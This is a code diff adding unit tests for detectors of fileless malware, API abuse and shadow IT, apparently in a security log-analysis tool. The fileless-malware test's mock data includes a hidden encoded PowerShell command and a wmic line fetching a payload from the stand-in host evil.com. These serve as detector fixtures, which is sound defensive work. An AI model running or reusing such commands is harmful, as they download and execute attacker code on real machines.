@@ -24,7 +24,10 @@ from strategies import (
     CryptoMiningStrategy,
     DNSAnomalyStrategy,
     AccountTakeoverStrategy,
-    DataStagingStrategy
+    DataStagingStrategy,
+    FilelessMalwareStrategy,
+    APIAbuseStrategy,
+    ShadowITStrategy
 )
 
 
@@ -1137,6 +1140,222 @@ class TestDataStagingStrategy(unittest.TestCase):
         explanations = self.strategy.get_column_explanations()
         self.assertIn('staging_score', explanations)
         self.assertIn('source_ip', explanations)
+
+
+class TestFilelessMalwareStrategy(unittest.TestCase):
+    """Test the Fileless Malware strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = FilelessMalwareStrategy()
+    
+    def test_fileless_attack_detection(self):
+        """Test that fileless attack patterns are detected."""
+        # Create mock data with suspicious PowerShell activity
+        data = []
+        for i in range(15):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'process_name': 'powershell.exe',
+                'command_line': 'powershell.exe -enc JABhAD0AJw -NoProfile -WindowStyle Hidden'
+            })
+        
+        # Add some WMI activity
+        for i in range(8):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'process_name': 'wmic.exe',
+                'command_line': 'wmic process call create "cmd.exe /c downloadfile http://evil.com/payload"'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'process_name': 'process_name',
+            'command_line': 'command_line'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect fileless activity
+        self.assertFalse(result.empty, "Should detect fileless attack patterns")
+        self.assertGreaterEqual(result.iloc[0]['fileless_score'], 50)
+        self.assertIn('source_ip', result.columns)
+        self.assertIn('fileless_score', result.columns)
+    
+    def test_normal_processes_not_flagged(self):
+        """Test that normal process activity is not flagged."""
+        # Create mock data with benign processes
+        data = []
+        for i in range(10):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'process_name': 'chrome.exe',
+                'command_line': 'chrome.exe --start-maximized'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'process_name': 'process_name',
+            'command_line': 'command_line'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal activity
+        self.assertTrue(result.empty, "Normal processes should not be flagged")
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('fileless_score', explanations)
+        self.assertIn('source_ip', explanations)
+        self.assertIn('suspicious_processes', explanations)
+
+
+class TestAPIAbuseStrategy(unittest.TestCase):
+    """Test the API Abuse strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = APIAbuseStrategy()
+    
+    def test_api_abuse_detection(self):
+        """Test that API abuse patterns are detected."""
+        # Create mock data with excessive API requests
+        base_time = datetime.now()
+        data = []
+        
+        # Generate high volume API requests with rate limiting
+        for i in range(600):
+            status = '200'
+            if i % 20 == 0:  # Some rate limit errors
+                status = '429'
+            
+            data.append({
+                'source_ip': '10.0.0.50',
+                'url_path': f'/api/v1/users/{i % 10}',  # Low diversity
+                'status_code': status,
+                'timestamp': base_time + timedelta(seconds=i * 0.1)  # ~10 req/sec
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'url_path': 'url_path',
+            'status_code': 'status_code',
+            'timestamp': 'timestamp'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect API abuse
+        self.assertFalse(result.empty, "Should detect API abuse patterns")
+        self.assertGreaterEqual(result.iloc[0]['abuse_score'], 50)
+        self.assertIn('source_ip', result.columns)
+        self.assertIn('rate_limit_errors', result.columns)
+    
+    def test_normal_api_usage_not_flagged(self):
+        """Test that normal API usage is not flagged."""
+        # Create mock data with reasonable API usage
+        data = []
+        for i in range(15):
+            data.append({
+                'source_ip': '10.0.0.50',
+                'url_path': f'/api/v1/profile',
+                'status_code': '200'
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'url_path': 'url_path',
+            'status_code': 'status_code'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag normal usage
+        self.assertTrue(result.empty, "Normal API usage should not be flagged")
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('abuse_score', explanations)
+        self.assertIn('source_ip', explanations)
+        self.assertIn('rate_limit_errors', explanations)
+
+
+class TestShadowITStrategy(unittest.TestCase):
+    """Test the Shadow IT strategy."""
+    
+    def setUp(self):
+        """Set up test data."""
+        self.strategy = ShadowITStrategy()
+    
+    def test_shadow_it_detection(self):
+        """Test that shadow IT usage is detected."""
+        # Create mock data with personal cloud usage
+        data = []
+        for i in range(30):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'dest_domain': 'dropbox.com',
+                'bytes_uploaded': 50000000  # 50 MB
+            })
+        
+        # Add some collaboration tools
+        for i in range(20):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'dest_domain': 'slack.com',
+                'bytes_uploaded': 10000000  # 10 MB
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'dest_domain': 'dest_domain',
+            'bytes_uploaded': 'bytes_uploaded'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should detect shadow IT
+        self.assertFalse(result.empty, "Should detect shadow IT usage")
+        self.assertGreaterEqual(result.iloc[0]['shadow_score'], 50)
+        self.assertIn('source_ip', result.columns)
+        self.assertIn('cloud_services', result.columns)
+    
+    def test_approved_services_not_flagged(self):
+        """Test that connections to approved services are not flagged."""
+        # Create mock data with corporate services
+        data = []
+        for i in range(10):
+            data.append({
+                'source_ip': '192.168.1.100',
+                'dest_domain': 'microsoft.com',
+                'bytes_uploaded': 1000000
+            })
+        
+        df = pd.DataFrame(data)
+        col_map = {
+            'source_ip': 'source_ip',
+            'dest_domain': 'dest_domain'
+        }
+        
+        result = self.strategy.analyze(df, col_map)
+        
+        # Should not flag approved services
+        self.assertTrue(result.empty, "Approved services should not be flagged")
+    
+    def test_column_explanations(self):
+        """Test that column explanations are provided."""
+        explanations = self.strategy.get_column_explanations()
+        self.assertIn('shadow_score', explanations)
+        self.assertIn('source_ip', explanations)
+        self.assertIn('cloud_services', explanations)
 
 
 if __name__ == '__main__':
